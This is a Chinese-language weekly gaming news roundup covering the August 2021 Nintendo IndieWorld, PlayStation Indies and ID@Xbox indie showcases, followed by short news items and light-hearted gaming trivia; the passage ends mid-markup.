收听这首音乐，或者按名称在你喜欢的音乐服务中搜索。为方便你在文章页面内直接播放，下面是这首音乐的在线播放版本：</p> <h2>要闻</h2>\n<p>「要闻」版块为你带来游戏领域最重要的话题性事件，除了展示足够丰富的细节，还有我主观的点评、吐槽或提问。游戏本身就是一种互动娱乐，我非常鼓励读者通过评论互动的方式，参与到话题中来，而不是仅仅当个「读」者。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/12/085a8ce6aff99247410b95e2ffcd9975.png\"><figcaption>定场诗打头</figcaption></figure><h3>任天堂 IndieWorld 独立游戏发布会：7 款游戏即日发售，《风来之国》压轴</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/12/f84fe0ed871b65cbceff55e01c689f6e.jpeg\"></figure><p><a href=\"https://www.youtube.com/watch?v=QDclD1QMmYM\">任天堂</a> 于 8 月 11 日举行了 Indie World 独立游戏线上发布会。</p>\n<h4>《风来之国》（Eastward）</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/13/099cad4f0e97cf48aaf94eb4b33118a5.png\"></figure><p>瞎玩菌感觉已经鸽了很久的《风来之国》（Eastward）（官方预告片：<a href=\"https://www.youtube.com/watch?v=8pbRNO4YDFI\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV1Nq4y1H7ed\">哔哩哔哩</a>）终于要来了，9 月 16 日登陆 Switch，并且已开启预售。</p>\n<h4>《炸弹跑酷赛博放克》（Bomb Rush Cyberfunk）</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/13/561cd46399888b9ba4bcc044124fb4a8.png\"></figure><p>《炸弹跑酷赛博放克》（Bomb Rush Cyberfunk）（官方预告片：<a href=\"https://www.youtube.com/watch?v=eIxNa3TNiSE\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV1Qp4y1n7Zf\">哔哩哔哩</a>）是一款涂鸦溜冰的冒险游戏，主张街头时尚风格。它将于 2022 年登陆 Switch（和其他平台）。</p>\n<h4>《循环勇者》（Loop Hero）</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/13/702968fc1916ebfe4c1ef4c67d52c970.png\"></figure><p>《循环勇者》（Loop Hero）（官方预告片：<a href=\"https://www.youtube.com/watch?v=n703nP2WDvM\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV1No4y1U7W8\">哔哩哔哩</a>）将于 2021 年底登陆 Switch 平台（已经上架过 Steam 平台）。</p>\n<h4>《铲子骑士：口袋地牢》（Shovel Knight: Pocket Dungeon）</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/13/4ebd98eadab897a5b369cca85c79abfb.png\"></figure><p>《铲子骑士：口袋地牢》（Shovel Knight: Pocket Dungeon）（官方预告片：<a href=\"https://www.youtube.com/watch?v=RcfQaOvgOG0\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV1Xo4y1m7Lh\">哔哩哔哩</a>）将于今年冬季登陆 Switch 平台。</p>\n<h4>《俄罗斯方块效应：连接》（Tetris Effect: Connected）</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/13/d14fe20bc7c0e7ce913a1a595d0e479b.png\"></figure><p>《俄罗斯方块效应：连接》（Tetris Effect: Connected）（官方预告片：<a href=\"https://www.youtube.com/watch?v=TpsJktNeeVA\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV1A341167QN\">哔哩哔哩</a>）还有可爱的黑白摄影冒险游戏《Toem》以及《合金弹头 战略版》都会登陆 Switch。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/13/59d9ee59874a4739a5c1bab739b8a38d.jpg\"></figure><p>其中《Toem》这款游戏，瞎玩菌在 Steam 新品节玩过，看似简单的黑白像素画风，实际上是 3D 游戏，支持旋转视角，拍照玩法也比较有趣，游戏的隐藏要素很多，需要细心和耐心，乐于探索和发现的玩家一定会喜欢这款游戏。</p>\n<h4>《公理边缘 2》（Axiom Verge 2）和其他 6 款游戏即日上架 Switch 平台</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/13/96f7d264743bc313d3b65456bbead6ea.png\"></figure><p>《公理边缘 2》（Axiom Verge 2）除了上架 Switch 平台，也登陆 PS 商店和 Epic 游戏商城，关于这款游戏的介绍可以往后查看 PlayStation Indies 部分，这里不重复介绍。</p>\n<p>除此还有 《Boyfriend Dungeon》《Necrobarista: Final Pour》《Garden Story》《Islanders: Console Edition》《Slime Rancher: Plortable Edition》和《Curious Expedition 2》这 6 款游戏在发布会<strong>当天</strong>上架 eShop 商店。</p>\n<p>还有一些移植到 Switch 平台的游戏公布了发售日期：</p>\n<ul>\n<li>《Astroneer》2022 年 1 月</li>\n<li>《Hundred Days — Winemaking Simulator》今年冬季</li>\n<li>《Gang Beasts》今年冬季</li>\n<li>《LumbearJack》2022 年</li>\n<li>《FAR: Changing Tides》 2022 年早些时候</li>\n</ul>\n<h3>索尼 PlayStation Indies 特别活动：《红怪》让玩家扮演怪物袭击人类</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/12/d8866e430d56b68aca25b9cca9defc2f.jpeg\"></figure><p><a href=\"https://blog.playstation.com/2021/08/05/new-indie-reveals-and-updates-take-the-spotlight/\">PlayStation</a> Indies 特别活动发布了一小波独立游戏，废话不多说，游戏名单如下。</p>\n<h4>《女巫之森》（Wytchwood）</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/12/0419d7187bddf7f1dbe15318f7597451.png\"></figure><p>《女巫之森》（Wytchwood）（官方预告片：<a href=\"https://www.youtube.com/watch?v=c_PVRoY8PDE\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV1Eo4y1D7Wp?from=search&amp;seid=1254718214575039031\">哔哩哔哩</a>）是 Alientrap Games 推出的一款风格独特的合成/酿造游戏。玩家将控制一个女巫在附近的树林中漫游，收集材料，遇到童话故事中的人物，并酿造各种混合物。开发者将游戏描述为「冷酷的」（chill）。游戏中的女巫试图做好事，她主要是想帮助人们，这样人们就会放过她了。</p>\n<p>《女巫之森》将于今年秋天登陆 PlayStation 4 和 PlayStation 5。</p>\n<h4>《Sol Cresta》</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/12/786bafeae15e6fed158ac44dbe47a523.png\"></figure><p>《Sol Cresta》（官方预告片：<a href=\"https://www.youtube.com/watch?v=L5BsIw9fV3E\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV1vv411K7Qy\">哔哩哔哩</a>）是白金工作室推出的一款竖版卷轴飞行射击游戏，也是 80 年代《Moon Cresta》和《Terra Cresta》游戏的官方续作。最初由日本 Bussan 公司开发，白金工作室采用了该系列游戏的理念，即通过与盟友的飞船对接来获得能量，以创造一个现代的 Cresta 游戏。</p>\n<p>游戏的特点是「停靠和分裂」系统，它允许玩家将他们的船队组合在一起以创造新的攻击方式。而不同的组合将改变类似于「百兽王合体」的飞船的行为方式。</p>\n<p>《Sol Cresta》将于今年晚些时候登陆 PlayStation 4。</p>\n<h4>《短途远足》（A Short Hike）</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/12/d67b47f231353b043a8dbc7c380feb59.png\"></figure><p>《短途远足》（A Short Hike）（官方预告片：<a href=\"https://www.youtube.com/watch?v=xL1UEDE_Jfw\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV1sA411P7dC?from=search&amp;seid=16968609165828238528\">哔哩哔哩</a>）是 Adam Robinson-Yu 的一款关于远足和飞行的游戏。玩家将控制克莱尔，一只能够通过地面或空中自由探索农村山坡的鸟。她在冒险中会遇到各种新朋友。</p>\n<p>游戏中还有一系列迷你游戏，如沙滩排球，以分散克莱尔在旅途中的注意力。</p>\n<p>《短途远足》最初于 2019 年在 Windows PC 上发布（Epic 曾经限免），今年秋天将登陆PlayStation 4。</p>\n<h4>《OXENFREE 2: Lost Signals》</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/12/5659859dffbc05c8fd280b8e4ffcd32a.png\"></figure><p>《OXENFREE 2: Lost Signals》（官方预告片：<a href=\"https://www.youtube.com/watch?v=LH8dYVPVxfM\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV1f64y1W7Wu\">哔哩哔哩</a>）是 Night School 工作室 2016 年《Oxenfree》的后续作品，它将登陆 PlayStation 4 和 PlayStation 5。最初的《Oxenfree》是一个关于鬼魂信号和维度裂缝的超自然故事。</p>\n<p>《OXENFREE 2: Lost Signals》中可以看到玩家扮演一个新的角色，Riley，去调查另一个谜团。游戏的玩法与第一部基本相同，其对话系统推动了游戏的进行。</p>\n<p>《OXENFREE 2: Lost Signals》将于 2022 年登陆 PS4 和 PS5。</p>\n<h4>《红怪》（CARRION）</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/12/e67b3e9de805701338b56071f0759998.png\"><figcaption>令人掉 san</figcaption></figure><p>《红怪》（CARRION）（官方预告片：<a href=\"https://www.youtube.com/watch?v=LFlYetHq76w\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV16V411B7Ea\">哔哩哔哩</a>）是去年由 Phobia Game Studio 推出的超级恐怖的怪物肉球游戏，即将登陆 PlayStation。该游戏已经在任天堂Switch、Windows PC 和 Xbox One 上推出。</p>\n<p>跟多数游戏不同的是，在这款游戏中玩家扮演的不是英雄或人类，而是怪物！</p>\n<p>《红怪》将在今年晚些时候在 PlayStation 上首次亮相。</p>\n<h4>《黑帝斯》（Hades）</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/12/fe915f3d763d8e5977d2aa0d5672b203.png\"></figure><p>获得过多款「年度游戏」奖项的《黑帝斯》（Hades）（PS5 实机游戏演示：<a href=\"https://www.youtube.com/watch?v=4O9OjywwM1I\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV1w64y1s7NL\">哔哩哔哩</a>）已经无需过多介绍。Supergiant 公司将于 8 月 13 日为 PlayStation 4、PlayStation 5、Xbox One 和 Xbox Series X 推出《黑帝斯》。</p>\n<h4>《公理边缘 2》（Axiom Verge 2）</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/12/f42e05ec5291b0dc11758283185813f0.png\"></figure><p>《公理边缘 2》（Axiom Verge 2）（官方预告片：<a href=\"https://www.youtube.com/watch?v=EOlpRihgMZA\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV1pv411K7Bk\">哔哩哔哩</a>）是 2015 年的类银河战士初代游戏的续作。该游戏的唯一开发者 Tom Happ 在 PlayStation 博客上提供了一个新的预告片，其中介绍了玩家在整个冒险过程中可以获得的一系列能力。</p>\n<p>但 Happ 还透露了另一个细节——《公理边缘 2》内含两个平行世界。游戏的整个地图还有另一个维度。玩家将能够在不同的维度之间跳跃，寻找新的秘密并推进游戏的故事。</p>\n<p>《公理边缘 2》将于今年晚些时候登陆 PlayStation 4 / PlayStation 5 / 任天堂 Switch 和Windows PC。</p>\n<h3>微软 ID@Xbox 发布会：游戏阵容多到介绍不过来</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/12/5b880c282fbe358f81d3fc1d8324421f.jpg\"></figure><p><a href=\"https://news.xbox.com/en-us/2021/08/10/icymi-twitchgaming-showcase-idxbox/\">ID@Xbox</a> 在 8 月 10 日的线上发布会中展示了多款独立游戏。</p>\n<p>官方还制作了游戏混剪预告片（<a href=\"https://www.youtube.com/watch?v=5cKwmgAadjs\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV1264y1x73G\">哔哩哔哩</a>），时长 1 分 39 秒，方便玩家快速预览这次发布的游戏阵容。</p> <h4>《<a href=\"https://www.microsoft.com/zh-cn/p/aeondrive-sgdemo/9nj42bqwf70z?rtc=1&amp;activetab=pivot:overviewtab\">Aeon Drive</a>》</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/12/ff47e0e7f90f56ead82cfdb69d453422.jpg\"></figure><p>这是来自 2awesome Studios 的游戏，将于 2021 年秋季登陆主机和 PC 端。游戏的试玩版本现已在 Xbox One 和 Xbox Series X 上发布!</p>\n<p>在《Aeon Drive》中急速穿越新巴塞罗那的赛博朋克景观，这是一款带有速通风格的动作平台游戏。</p>\n<h4>《<a href=\"https://labrat.study/\">Lab Rat</a>》</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/12/978c559369b3473bdba93abe89c40b1f.png\"></figure><p>这是来自 Chump Squad 的游戏，将于 2022 年登陆主机和 PC 端。</p>\n<p>《Lab Rat》是一个讽刺性的冒险游戏，由一个痴迷于计量学的 AI 主演，他将在你通过一百多个令人满意的、改变类型的推箱子谜题时，监控、剖析和取悦你。</p>\n<h4>《<a href=\"https://www.microsoft.com/zh-cn/p/library-of-ruina/9pld3nb588zl?rtc=1\">废墟图书馆</a>》（Library of Ruina）</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/12/da43f35b010dc09e16ff685aab42651f.jpg\"></figure><p>这是来自 Project Moon 的游戏，现已登陆主机和云游戏。</p>\n<h4>《OlliOlli World》</h4>\n<p>这是来自 Private Label 的游戏，将于 2021 年冬季登陆主机。</p>\n<h4>《<a href=\"https://www.microsoft.com/zh-cn/p/sam-max-save-the-world/9nj7fh3hb8sr?rtc=1#activetab=pivot:overviewtab\">Sam &amp; Max Save the World Remastered</a>》</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/12/ed90c1bcc1a853bfc7f917ee214987c2.jpg\"></figure><p>这是来自 Skunkape Games 的游戏，现已登陆主机。</p>\n<h4>《<a href=\"https://www.microsoft.com/zh-cn/p/spacelines-from-the-far-out-beta-demo/9pbn4ztm7j4r?rtc=1\">Spacelines From the Far Out</a>》</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/12/be257ab457e77ecdf49e60ba0cc3cf1b.jpg\"></figure><p>这是来自 Coffeenauts 的游戏，将于 2021 年秋季登陆主机和 PC 端。</p>\n<h4>《The Big Con》</h4>\n<p>这是来自 Mighty Yell 工作室 的游戏，将于 2021 年 8 月 31 日登陆主机和 PC 端。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/13/ab947537388da396ad7743b1a52b2d1c.jpg\"></figure><p>篇幅所限，瞎玩菌无法完整介绍发布会中出现的所有游戏，完整的游戏名单如下（按字母顺序排序），感兴趣的读者可以自行了解相关信息。</p>\n<ul>\n<li>Aeon Drive (2awesome Studios)</li>\n<li>ANVIL (Action Square)</li>\n<li>Aragami 2 (Lince Works) – coming to Xbox Game Pass</li>\n<li>Button City (Subliminal)</li>\n<li>Evil Genius 2 (Rebellion Interactive) – coming to Xbox Game Pass</li>\n<li>Inked (Byte Dance)</li>\n<li>Inkulinati (Yaza Games)</li>\n<li>Lab Rat (Chump Squad)</li>\n<li>Library of Ruina (Project Moon) – coming to Xbox Game Pass</li>\n<li>Lightyear Frontier (FRAME BREAK)</li>\n<li>Loot River (Straka Studio)</li>\n<li>Mad Streets (Craftshop Arts)</li>\n<li>OlliOlli World (Private Label)</li>\n<li>Pathfinder Wrath of the Righteous (Owlcat)</li>\n<li>Planet of Lana (Wishfully)</li>\n<li>Project Wingman (Sector D2)</li>\n<li>Pupparazzi (Kitfox Games) – coming to Xbox Game Pass</li>\n<li>RPG Time (Deskworks)</li>\n<li>Sable (Shedworks)</li>\n<li>Sam &amp; Max Save the World Remastered (Skunkape Games)</li>\n<li>She Dreams Elsewhere (Studio Zevere)</li>\n<li>Solace State (Vivid Foundry)</li>\n<li>Soup Pot (Chikon Club)</li>\n<li>Spacelines From the Far Out (Coffeenauts)</li>\n<li>Stardew Valley (Concerned Ape) – coming to Xbox Game Pass</li>\n<li>The Big Con (Mighty Yell Studios)</li>\n<li>The Vale: Shadow of the Crown (Falling Squirrel)</li>\n<li>The Wandering Village (Stray Fawn)</li>\n</ul>\n<h2>简讯</h2>\n<p>「简讯」版块是为了控制游戏周报的篇幅，并保持足够的信息量。大部分时候瞎玩菌尽量用一句话浓缩信息，也可能不止一句话。感兴趣的读者可以点击每条新闻末尾的链接符号 🔗 以了解更多信息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/11/798b5fe34cb857c8dcf18bae5f0b8d51.png\"></figure><ul><li>2021 bilibili 游戏新品发布会公布了 16 款新游戏，其中包含《<a href=\"https://game.bilibili.com/ylxe/\">代号：依露希尔</a>》《<a href=\"https://game.bilibili.com/re/\">代号：C</a>》《<a href=\"https://game.bilibili.com/dhy/\">代号：夜莺</a>》 等 6 款首次公布的自研游戏和《<a href=\"https://game.bilibili.com/ete/\">代号：艾塔</a>》《<a href=\"https://game.bilibili.com/kungfu/\">代号：绝世好武功</a>》《<a href=\"https://game.bilibili.com/huntersmoon/\">代号：红月</a>》《<a href=\"https://game.bilibili.com/acultivationsimulator/\">代号：了不起的模拟器</a>》等 10 款代理游戏。从如此多的「代号」可以看出，很多游戏都处于较早期的阶段，甚至连游戏名字还没确定。感兴趣的玩家可以从末尾的链接回顾时长 1 小时 37 分的完整发布会视频，并在页面上预约新游。 <a href=\"https://game.bilibili.com/2021bilibiliGamefbh/\">🔗</a>\n</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/11/6debbf5451846231232b944b0a8b3694.png\"></figure><ul><li>Steam 版的「吃鸡」《绝地求生》改名为《PUBG: BATTLEGROUNDS》 并宣布进行为期一周的免费游玩活动，到北京时间 8 月 17 日 5 点截止。注意只有 Steam 平台有免费游玩活动，其他平台的版本没有。虽然游戏的名字改了，但中国玩家还是叫它「吃鸡」。 <a href=\"https://store.steampowered.com/app/578080/PUBG_BATTLEGROUNDS/\">🔗</a>\n</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/11/c4c2d3a13a650890b17ba9acae49a3c9.png\"></figure><ul>\n<li>筹备 3 年的新游戏《奕剑行》上线第一天就被黑客组织 ACCN 通过 DDoS 攻击到关服，后者向开发者勒索 1.5 万元以解除攻击。据说该黑客组织已经用相同的手法攻击过多款国产游戏，并勒索开发者，并且只找反抗能力有限的小型开发者下手。 <a href=\"https://www.taptap.com/topic/18940396\">🔗</a>\n</li>\n<li>因暴雪性骚扰丑闻，包含可口可乐在内的《守望先锋》多个品牌赞助商撤资。 <a href=\"https://www.washingtonpost.com/video-games/2021/08/05/activision-blizzard-sponsors-overwatch/\">🔗</a>\n</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/11/be527cc31b506230cf5cf6f3b78e735a.jpg\"></figure><ul><li>Nvidia 公布了专为小型工作站设计的显卡 RTX A2000，体积只有 RTX 3090 的一半左右。 <a href=\"https://www.nvidia.com/en-gb/design-visualization/desktop-graphics/\">🔗</a>\n</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/11/86f9b8edf83b7d0421382aa173d9a03a.jpeg\"></figure><ul><li>Epic 为了首批的 23 款独占游戏已亏本 1.3 亿美元，这个数字来自 Epic 与苹果的诉讼法律文书（上图，游戏名和开发者已被遮盖）。<a href=\"https://www.reddit.com/r/fuckepic/comments/ov572q/wave_1_minimum_guarantees/\">reddit</a> 上的用户根据游戏在 Epic 游戏商城的上架日期，推测出来了部分游戏的数据（下图），注意推测的游戏有可能不准确，因为有多款游戏在同一天上架。 <a href=\"https://twitter.com/simoncarless/status/1422563207244251144\">🔗</a>\n</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/11/08c9d693ec5f909aca48cc8f4e22d93a.jpeg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/11/98091c320b6a798fe373eeabb81f935c.jpeg\"><figcaption>Steam Deck（下）与任天堂 Switch（上）大小对比。图源 <a href=\"https://twitter.com/tomwarren/status/1423691702229946378\">Twitter Tom Warren</a></figcaption></figure><ul><li>推荐多个 Steam Deck 的上手体验视频（点击视频标题即可跳转观看，注意链接均为 Youtube 视频），分别是 Linus Tech Tips 的《<a href=\"https://www.youtube.com/watch?v=SElZABp5M3U&amp;t=54s\">I tried Steam Deck early and it's AWESOME!</a>》，The Verge 的《<a href=\"https://www.theverge.com/2021/8/6/22612886/valve-steam-deck-handheld-gaming-pc-hands-on-preview\">Valve Steam Deck hands-on: the Nintendo Switch of PC gaming</a>》，GameSpot 的《<a href=\"https://www.youtube.com/watch?v=83ftXPVULGY\">Valve's Steam Deck - First Impressions</a>》，Adam Savage's Tested 的《<a href=\"https://www.youtube.com/watch?v=jb6OWxORfY0\">Steam Deck Hands-On with Valve's Handheld Gaming PC!</a>》。 <a href=\"https://www.youtube.com/watch?v=jb6OWxORfY0\">🔗</a>\n</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/11/7dc1ecb54229731895f78d7c44e0042d.jpg\"><figcaption>图源 <a href=\"https://weibo.com/2039753857/KsuDakI8W\">微博 CCTV4</a></figcaption></figure><ul><li>中央电视台总台华语环球节目中心（CCTV 4）在 20 集系列微视频《有朋自远方来——中国共产党与国际友人的故事》的第 19 集《添田修平 永远做中日人民的友好桥梁》介绍了「五仁叔」添田武人的父亲——添田修平。你可以通过末尾链接观看时长 6 分 15 秒的视频。 <a href=\"https://weibo.com/2039753857/KsuDakI8W\">🔗</a>\n</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/11/0a251b59255a0b85442cede57955f9da.jpeg\"></figure><ul>\n<li>微软宣布将于北京时间 8 月 25 日凌晨 1 点举行科隆电玩展（gamescom）前的特别直播活动。按照 Xbox 的尿性，这次发布会很有可能依然是 Xbox Game Pass 的大型广告宣传片。 <a href=\"https://news.xbox.com/en-us/2021/08/09/join-us-for-the-gamescom-2021-xbox-stream-and-more/?ocid=Event_soc_omc_xbo_tw_photo_lrn_8.9.2\">🔗</a>\n</li>\n<li>Xbox Insider 成员已经可以通过 Windows 10 或 Windows 11 的 Xbox 应用直接访问 Xbox 云游戏，而不仅是通过浏览器访问 <a href=\"https://xbox.com/play\">xbox.com/play</a> 这种方式。 <a href=\"https://news.xbox.com/en-us/2021/08/09/xbox-cloud-gaming-beta-available-for-insiders-through-the-xbox-app-for-windows/\">🔗</a>\n</li>\n<li>Xbox 全新的夜间模式可以让屏幕、手柄和电源按钮变暗，甚至过滤蓝光。 <a href=\"https://news.xbox.com/en-us/2021/08/06/xbox-insider-release-notes-alpha-skip-ahead-2109-210804-2200/\">🔗</a>\n</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/13/d98b4ce6124abf021bdd96aaafc9601b.JPG\"></figure><ul>\n<li>《微软模拟飞行》（Microsoft Flight Simulator）将于明年正式支持中文，官方已将开发计划公示。之前玩家们在官方论坛的中文化请愿圆满成功，这一提议最终获得 1543 票，位列所有反馈中得票数第一名。 <a href=\"https://forums.flightsimulator.com/t/blog-august-12th-2021-development-update/439396\">🔗</a>\n</li>\n<li>分享一篇来自 Polygon 的深度报道文章《<a href=\"https://www.polygon.com/22610490/fullbright-steve-gaynor-controversy-stepped-down-open-roads\">Fullbright co-founder Steve Gaynor accused of employee mistreatment</a>》，讲述了《Gone Home》背后的工作室 Fullbright 如何被联合创始人 Steve Gaynor 以一种疑似职场 PUA 的方式给搞得支离破碎，期间工作室的多名女性员工被恶意贬低并因此离职。 <a href=\"https://www.polygon.com/22610490/fullbright-steve-gaynor-controversy-stepped-down-open-roads\">🔗</a>\n</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/13/d286ce42edc902afb63f0d5f5b147ee1.jpg\"></figure><ul><li>《求生之路》开发团队的新游戏《喋血复仇》（Back 4 Blood）于 8 月 12 日开启 beta 测试，10 月 12 日发售。 <a href=\"https://back4blood.com/en-us/beta\">🔗</a>\n</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/13/e6ebdb43fef7348467432a53a28ceac5.jpg\"></figure><ul><li>类似《文明》的 4X 策略游戏《人类》（Humankind）将于 8 月 17 日上市，并且首发加入 XGP。 <a href=\"https://humankind.game/\">🔗</a>\n</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/13/161821b4b63fbc12fbd12861c9e566f3.jpg\"></figure><ul><li>《胡闹厨房》系列 5 周年之际，官方为《胡闹厨房：全都好吃》推出了免费生日派对更新。 <a href=\"https://store.steampowered.com/app/1243830/_/\">🔗</a>\n</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/13/2d195653095acfedc67be48327b5954f.jpg\"></figure><ul><li>《无人深空》 5 周年之际，官方推出免费扩展包「边疆」(Frontiers)。 这已经是该游戏的第 15 个免费扩展更新。 <a href=\"https://store.steampowered.com/app/275850/No_Mans_Sky/\">🔗</a>\n</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/13/f638495ecee9cfc4f45ac562883fe996.png\"></figure><ul><li>《地狱之刃：赛娜的献祭》（Hellblade: Senua's Sacrifice）为 Xbox Series X | S 推出了免费的次世代版本更新。 <a href=\"https://www.youtube.com/watch?v=fq2mp2u0tXc\">🔗</a>\n</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/13/782dfc60add2f08234acfbe168413ddb.png\"></figure><ul><li>当你在《玩具总动员》的世界里开着玩具小汽车，但是玩法却跟《糖豆人》差不多，这就是新游戏《Vroom!》。这款游戏将于明年登陆 PC 和主机平台。 <a href=\"https://www.youtube.com/watch?v=2MeqPQCwNtU\">🔗</a>\n</li></ul>\n<h2>彩蛋</h2>\n<p>「彩蛋」版块旨在分享有趣或有料的游戏相关内容，但不是严肃的游戏新闻。内容来源不限于玩家社群，MOD，二创，同人或 ACG 衍生的亚文化等。</p>\n<h3>🌈🥚1 王思聪为了游戏加速等需求攒机，结果跑分世界第四</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/11/88da0ea7da3a5882d6a57bf259dade51.png\"></figure><p>王思聪使用「钞能力」把这个梗变成了现实。</p>\n<p>来自电丸科技的视频（<a href=\"https://www.youtube.com/watch?v=cHoza8qyiw4\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV1z54y177iw\">哔哩哔哩</a>）。</p> <h3>🌈🥚2 最佳伪装！PS5 化身 TP-LINK 路由器</h3>\n<p>老婆：「这啥？」</p>\n<p>我：「500 块买的新款 TP-LINK 路由器，现在不 5G 时代了吗，路由器也得升级一下。」</p>\n<p>老婆：「哦。」</p>\n<p>两天后……</p>\n<p>老婆：「给你 600 块钱，我老弟说让你给他也买一个，剩下 100 块当你这个月零花钱吧。」</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/11/167d6f4f5c44fb0464645da6236cb70e.jpeg\"><figcaption>图源 <a href=\"https://twitter.com/jamella_hoshino/status/1424657393233825792\">Twitter 阿米娜・阔伊姆@頑張らない？</a></figcaption></figure><h3>🌈🥚3 Youtube 主播自制 PS2 掌机，命名为 PS2 Eclipse</h3>\n<p>来自 GingerOfOz 的视频《<a href=\"https://www.youtube.com/watch?v=LQ7x2b6BlHk\">My First Portable PS2 - The PS2 Eclipse</a>》。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/11/7f3b42f4a172b502804e756dcc3b3e8d.jpeg\"></figure><h3>🌈🥚4 任天堂 Switch 上架新游戏《战斗计算器》（Battle Calculator）</h3>\n<p>对战玩法是，多名玩家（最多 4 名）根据系统给出的数字，输入对应的算式，最先完成的人赢。</p>\n<p>该游戏现已上架 eShop，售价为 14.99 美元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/11/266cad8687befbbf0d6749966a1bfeab.jpeg\"></figure><p>建议任天堂官方可以快进推出一款吃鸡玩法的《计算器 99》。</p>\n<h3>🌈🥚5 年轻人的第一个 LV（游戏）！LV 官方推出免费游戏，游戏内抽奖价值超过一个 LV 包包</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/12/48e06b1266c77b963783be1784912e22.jpg\"></figure><p>为了庆祝创始人路易·威登的 200 岁生日，LV 推出了一款游戏《Louis The Game》（下载地址： <a href=\"https://apps.apple.com/us/app/louis-the-game/id1574401807\">iOS</a> | <a href=\"https://play.google.com/store/apps/details?id=com.louisvuitton.LV200&amp;hl=en_US&amp;gl=US\">Android</a>）。</p>\n<span class=\"ss-application\" app-id=\"16139\"> </span><span class=\"ss-application\" app-id=\"16140\"> </span><p>游戏玩法类似《Sky · 光遇》，以探索和收集为主。玩家可以收集到一些明信片，有概率遇到黄金明信片，即可参与抽奖。抽奖的奖品是限量 30 份的 NFT 数字藏品，距估算价值超过一个 LV 包包。</p>\n<h3>🌈🥚6 推荐一期游戏开发者讲述的播客《E25 做个哲学游戏吧！——在语言之前的，和那比语言更多的》，来自播客落日间</h3>\n<figure class=\"image ss-img-wrapper\"><img 